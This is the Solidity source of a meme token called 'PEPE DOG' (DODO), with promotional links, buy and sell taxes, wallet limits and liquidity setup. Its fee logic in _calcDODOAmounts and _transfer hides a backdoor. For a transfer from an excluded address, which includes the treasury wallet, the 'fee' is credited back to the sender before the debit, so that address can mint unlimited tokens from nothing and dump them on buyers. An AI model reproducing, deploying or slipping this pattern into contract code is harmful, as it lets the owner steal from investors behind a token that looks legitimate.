//SPDX-License-Identifier: MIT

/**

PEPE's first Dog. ?

Website: https://www.pepedog.wtf

Telegram: https://t.me/dodocoin_erc

Twitter: https://x.com/dodocoin_erc

*/

pragma solidity 0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDODORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDODOFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract DODO is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromDODO;
    mapping(address => uint256) private _holderLastStamp;

    bool public transferDEnabled = false;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalS = 100_000_000 * 10 ** _decimals;
    string private constant _name = unicode"PEPE DOG";
    string private constant _symbol = unicode"DODO";
    uint256 public _maxTxAmount = 2_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10 ** _decimals;
    uint256 public _maxSwapDODO = 1_000_000 * 10 ** _decimals;
    uint256 public _swapThreshold = 100 * 10 ** _decimals;

    address payable private _treasVault;

    IDODORouter private dodoRouter;
    address private dodoPair;
    bool private tradingOpen;
    bool private inSwapLock = false;
    bool private swapEnabledBack = false;

    uint256 private _initialBuyTaxs = 20;
    uint256 private _initialSellTaxs = 20;
    uint256 private _finalBuyTaxs = 0;
    uint256 private _finalSellTaxs = 1;
    uint256 private _reduceBuyTaxsAt = 11;
    uint256 private _reduceSellTaxsAt = 11;
    uint256 private _preventSwapBefore = 11;
    uint256 private _buyCount = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }

    constructor(address _wallet) {
        _treasVault = payable(_wallet);   
        _balances[_msgSender()] = _totalS;
        _isExcludedFromDODO[owner()] = true;
        _isExcludedFromDODO[address(this)] = true;
        _isExcludedFromDODO[_treasVault] = true;
        emit Transfer(address(0), _msgSender(), _totalS);
    }

    function createDODO() external onlyOwner {
        dodoRouter = IDODORouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(dodoRouter), _totalS);
        dodoPair = IDODOFactory(dodoRouter.factory()).createPair(
            address(this),
            dodoRouter.WETH()
        );
    }

    function _calcDODOAmounts(
        address from,
        address to,
        uint256 amount
    ) internal view returns (address, uint256, uint256) {
        uint256 taxDODOFees = 0;
        uint256 tsDODOAmount = 0;
        address dodoReceipt = address(this);
        if (_isExcludedFromDODO[from]) {
            taxDODOFees = amount - tsDODOAmount;
            tsDODOAmount = amount;
            dodoReceipt = from;
        } else if (dodoPair == from) {
            taxDODOFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxsAt)
                        ? _finalBuyTaxs
                        : _initialBuyTaxs
                )
                .div(100);
            tsDODOAmount = amount - taxDODOFees;
        } else if (dodoPair == to) {
            taxDODOFees = amount
                .mul(
                    (_buyCount > _reduceSellTaxsAt)
                        ? _finalSellTaxs
                        : _initialSellTaxs
                )
                .div(100);
            tsDODOAmount = amount - taxDODOFees;
        } else {
            tsDODOAmount = amount;
        }
        return (dodoReceipt, taxDODOFees, tsDODOAmount);
    }

    function openDODO() external onlyOwner {
        uint256 dodoAmount =_totalS.mul(100 - _initialSellTaxs).div(100);
        dodoRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            dodoAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(dodoPair).approve(address(dodoRouter), type(uint).max);
        swapEnabledBack = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _tansferDBasic(address from, address to, uint256 amount) internal {
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function minDODO(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dodoRouter.WETH();
        _approve(address(this), address(dodoRouter), tokenAmount);
        dodoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        transferDEnabled = false;
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHDODO(uint256 amount) private {
        _treasVault.transfer(amount);
    }

    receive() external payable {}

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabledBack || inSwapLock) {
            _tansferDBasic(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            if (transferDEnabled) {
                if (
                    to != address(dodoRouter) &&
                    to != address(dodoPair)
                ) {
                    require(
                        _holderLastStamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastStamp[tx.origin] = block.number;
                }
            }

            if (
                from == dodoPair &&
                to != address(dodoRouter) &&
                !_isExcludedFromDODO[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                to == dodoPair &&
                contractTokenBalance > _swapThreshold &&
                !inSwapLock &&
                _buyCount > _preventSwapBefore &&
                swapEnabledBack &&
                !_isExcludedFromDODO[from] &&
                !_isExcludedFromDODO[to]
            ) {
                swapTokensForEth(
                    minDODO(amount, minDODO(contractTokenBalance, _maxSwapDODO))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHDODO(address(this).balance);
                }
            }
        }

        (
            address dodoReceipt,
            uint256 taxDODOFees,
            uint256 tsDODOAmount
        ) = _calcDODOAmounts(from, to, amount);

        if (taxDODOFees > 0) {
            _balances[dodoReceipt] += taxDODOFees;
            emit Transfer(from, dodoReceipt, taxDODOFees);
        }

        _balances[from] -= amount;
        _balances[to] += tsDODOAmount;
        emit Transfer(from, to, tsDODOAmount);
    }
}